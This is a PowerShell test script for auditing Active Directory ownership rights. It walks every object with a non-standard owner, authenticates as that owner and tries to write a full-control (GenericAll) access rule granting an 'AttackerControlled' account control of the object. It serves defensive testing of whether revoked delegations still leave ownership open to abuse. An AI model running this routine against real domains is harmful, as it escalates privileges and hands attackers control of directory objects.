<#This snippet will attempt to use the remaining permissions that AD Object Owners may have to create a dangerous ACE for an "attacker" controlled account.
Run this after Remove-TestUserGroups.ps1 and ensuring all permissions are revoked on the test users.  
Then run the Get-ObjectOwnerInfo.ps1 and Get-OwnerACEs.ps1 again to compare and determine where the attempt to abuse ownership privileges was successful.#>

$Password = Read-Host "Enter a password for test users:"  -AsSecureString

$ErrorActionPreference="SilentlyContinue"
Stop-Transcript | out-null
$ErrorActionPreference = "Continue"
Start-Transcript -path C:\Scripts\Abuse-OwnershipNew.txt -append

$Domain = Get-ADDomain
$DomainNETBIOS = $Domain.NetBIOSName
$TargetPC = 'capcom-19'
$AttackerName = "AttackerControlled"
[string]$DN
[string]$DelegatedUser

$ADObjects = Get-ADObject -Filter * -properties ntSecurityDescriptor | Select-Object -Property Name, @{Name='ntSecurityDescriptorOwner'; Expression={$_.ntSecurityDescriptor.Owner }}, DistinguishedName | Where-Object { $_.ntSecurityDescriptorOwner -notlike "$DomainNETBIOS\Domain Admins" -and $_.ntSecurityDescriptorOwner -notlike "$DomainNETBIOS\Enterprise Admins" -and $_.ntSecurityDescriptorOwner -notlike "NT AUTHORITY\SYSTEM" -and $_.ntSecurityDescriptorOwner -notlike "BUILTIN\Administrators" -and $_.ntSecurityDescriptorOwner -notlike "$DomainNETBIOS\*`$" }

Set-Location AD:
foreach($ADObject in $ADObjects) {
    Write-Host "AD Object: " $ADObject.DistinguishedName
    Write-Host "Owner: " $ADObject.ntSecurityDescriptorOwner
    
    $DelegatedUser = $ADObject.ntSecurityDescriptorOwner.Split("\")[1]
    $Credential = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $DelegatedUser,$Password 
    $DN = $AdObject.DistinguishedName
    
    # Attempt to add Full Control ACE for an Attacker Controlled Account to each object that has a non-standard Owner.
    $output =  Invoke-Command -ComputerName $TargetPC  -Credential $Credential -ArgumentList $AttackerName, $DelegatedUser, $DN, $ACL -ScriptBlock {param($AttackerName, $DelegatedUser, $DN, $ACL )
    whoami.exe /All
        
    <#
    This method doesn't work.  Use ADSI instead
    $User = Get-ADUser -Identity $AttackerName
    $AttackerSID = [System.Security.Principal.SecurityIdentifier] $User.SID
    $ACL = Get-Acl -Path $DN
    
    $Identity = [System.Security.Principal.IdentityReference] $AttackerSID
    $ADRight = [System.DirectoryServices.ActiveDirectoryRights] "GenericAll"
    $Type = [System.Security.AccessControl.AccessControlType] "Allow"
    $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
    $Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($Identity, $ADRight, $Type,  $InheritanceType)
    
    $ACL.AddAccessRule($Rule)
        
    Set-Acl -Path $DN -AclObject $ACL #>
    
    $ADSI = [ADSI]"LDAP://$DN"
    #$IdentityReference = (New-Object System.Security.Principal.NTAccount($AttackerName)).Translate([System.Security.Principal.SecurityIdentifier])
    $IdentityReference = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier](Get-ADUser $AttackerName).SID)
    $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
    $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
    $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, $ADRights, $ControlType, $InheritanceType
    $ADSI.PsBase.Options.SecurityMasks = 'Dacl'
    $ADSI.PsBase.ObjectSecurity.SetAccessRule($ACE)
    $ADSI.PsBase.CommitChanges()
    }
    Write-Host "-------------------------------------------------"
}

Stop-Transcript

